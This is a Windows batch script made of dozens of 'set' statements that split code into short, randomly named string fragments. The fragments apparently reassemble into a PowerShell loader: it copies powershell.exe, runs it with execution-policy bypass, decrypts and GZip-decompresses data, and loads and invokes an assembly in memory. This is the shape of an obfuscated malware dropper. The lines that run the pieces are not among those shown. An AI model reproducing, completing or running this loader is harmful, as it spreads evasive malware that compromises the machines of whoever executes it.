@echo off
set "MzsIjsJTOe=1."
set "YQzzIPOPkR=rs"
set "KUtYajTNAn=Po"
set "bkawqEIPcD=he"
set "ZiQDFGaqvI=po"
set "AuBsmkPPxd=nd"
set "YXKQNAYvdd=32"
set "stxgjEeIHj=ll"
set "pMOegKjatv=we"
set "LxMdUFttqe= /"
set "djbMEzRlVl=:\"
set "QBtOMmDSiS=ow"
set "nxWNzHhUtq=\v"
set "vFENrybEao=py"
set "dWdVpcAMrm=he"
set "vQpHYjIrUQ=.e"
set "XUKrvMrYdU=do"
set "JcORvtUwNh=st"
set "ppCXKJHJAt=Sy"
set "KfiawlUsxh=y "
set "UnlAtUHliW=Wi"
set "iPeXpAllHZ=in"
set "UFsaztmPGm=we"
set "mcNzFKwuuS=rS"
set "SlfEGKFWKV=xe"
set "SExQFIKoDR=ll"
set "jxJgCHFWUX=0\"
set "GPIOtdmReG=s\"
set "qxsxBXALUl= C"
set "IhmYbqmnaQ=co"
set "EUrOiEbRta=\W"
set "vysJCxxpiL=ws"
set "rPdqqLLNYj=em"
set "tkLCEGBKng= %~dp0"
set "IuLdvDTZbp=cd"
set "KtFBNUkacN=zmYA"
set "TWARVWUZbD=.Cre"
set "iRcKXeeOoa=($hn"
set "KNcSJSdCBh=v = "
set "GrNHlmZPEq=  $Q"
set "nMmqwmROoo=tS46"
set "NZvhvyHKiP=Wyqo"
set "DxNyMrNsCu=stem"
set "FeVUgLRueo=raph"
set "GPophxuKNc=am;$"
set "HDbEAZXxEm=em.C"
set "ArzEabfSmA=pher"
set "YHXltisgGU=ct S"
set "rmcVvxcrlS=qO.D"
set "FYiDWsngnM=RJJm"
set "vsnVkCvZmT=ddin"
set "tpAjNsJDzN=rity"
set "qnoWsZkUre=$jzl"
set "psBlcJWPcd=Cv);"
set "GmrdXkiTWe=join"
set "SSbfzxdmOc=] -j"
set "QuzIHfLiKs=aDNK"
set "sJmFhpKvjc=Mode"
set "asaSWbodwW=New-"
set "wSSUFdHIMg='')("
set "racHsVebVW=8kuY"
set "nXeOUAUCaR=]::("
set "ERINOexARW=;$cL"
set "RdCUgNivUy=.GZi"
set "LSaDtaUPKw=pres"
set "EWiCciZSlw=7kGw"
set "nZBPloLilm=();$"
set "KUfxJnLmtu=tem."
set "kcsNSHcidH=-1.."
set "couEBmlcxL=F'[-"
set "fNOdghKbiB=.Ass"
set "ZVSVLbDjLy=t Sy"
set "fjCrwhNcDR=yste"
set "ykEBGEiduN=YAv "
set "RhNyMziyaj=[Env"
set "jCUSuUcRSj=File"
set "gNOaUuCxgy= if "
set "HhSOMMdxXH=ionM"
set "LLDpWTTSLR=6] -"
set "EKDrrUBmOq=tsWi"
set "hqjquElGNX=yCOS"
set "xxwiImsliv=O = "
set "DqouPgeTap=.Sec"
set "HfnrzoqNtc=ewLi"
set "QayXDuFDFS=:: '"
set "cIVYXSspXB=);$R"
set "qXNOsEFNFq=]::C"
set "zCdsIQWcHI=bypa"
set "DLVbEzlWqj=Invo"
set "WHlrGxgbtm= '')"
set "DaLbqjAHeD=rtS4"
set "dlzOaMCrku=IoO3"
set "EgvBMgKHGO=cLIp"
set "nnAznRiCZe=Secu"
set "qXzdcfRDPr=orF'"
set "jTNKQssKwg=Comp"
set "qLEhdqhIXB=rt]:"
set "DOklFZiznG=ateD"
set "eVnVumKGYt===')"
set "evHlLtjgyB=.Cop"
set "WENttKluGI=);$h"
set "UOKzcEPGcc=rofi"
set "WYdHykCQza=fore"
set "jNSrhdAlIy=FcNh"
set "AZFYoieBgx=Syst"
set "jOVkLXtpzM=bjec"
set "mstQiwnaaU=TllA"
set "tpriCLbZVE=and "
set "XCaJOCDKlw=b.Pa"
set "gOpjFhqjIZ=, (,"
set "hnrfmaqpDM=m.IO"
set "mGdfuGVYqq=Conv"
set "iNwgzJyvpq=yste"
set "XoxKkcbYYd=comp"
set "fnitYVkzoT=-ep "
set "BPUhWZUOQx=.Len"
set "OwAasLByec=al ="
set "bXVzLSTfZr=lACv"
set "dwrbKSqtum=AlqO"
set "CnuMuceXCj=Bmor"
set "QybrjKwVmx=ispo"
set "jvwsTLpRZt=sion"
set "rWzcRkEwjc=ddin"
set "MQCwiPmevj=.Cry"
set "TFYQKKIYlL=pN.T"
set "QzhjPxEvwy=Comp"
set "ibrppdNylN=O.Me"
set "aAkBRpGZGn=16] "
set "AfWeyloLdq=$hAl"
set "BiboUQJWwM=lpN "
set "VMumQswSiy=ke($"
set "MUsZcqbTrM=raph"
set "WziHwaPzUx=ck($"
set "SHkJWFGILL=m.IO"
set "FUalyIXZgA=nage"
set "ETWpgurGxR=ay()"
set "FlPuhdYHyz=New-"
set "nnvygVkGFD=6esa"
set "XqHuwCLfgs=Fina"
set "OjFbPDyFTO=n ''"
set "RWlIYRogpX= = $"
set "uPYpLcntIS=Y.Su"
set "pIgWrDEais='txe"
set "sxKdwQOzbJ=)) {"
set "ZmKlfHFgLg=zm83"
set "AQtifhlYyq=ClAC"
set "kxhhEWyZka=Obje"
set "LLYnYMLqvd=]::N"
set "SWdhhCbbNo=[-1."
set "yPnLjyigzv=CuSj"
set "LFKovHNTnQ=7;$R"
set "DlfUjBeTMl=)($Q"
set "NuTlfWSuDw=rity"
set "EUnJmnZhmK=tem."
set "DlheYKYLZe=)))"
set "qbJAXdsAND=..-1"
set "OtyFUsRMWK=Disp"
set "ADRjFZJqZg=oL'["
set "ZhqetGHrDD=ress"
set "arERHLdlix=tem."
set "PNButyOBlo=onve"
set "klmrjKaYho=V = "
set "SiikBcAoQO=.Mod"
set "ABqiQuvpFo= [Sy"
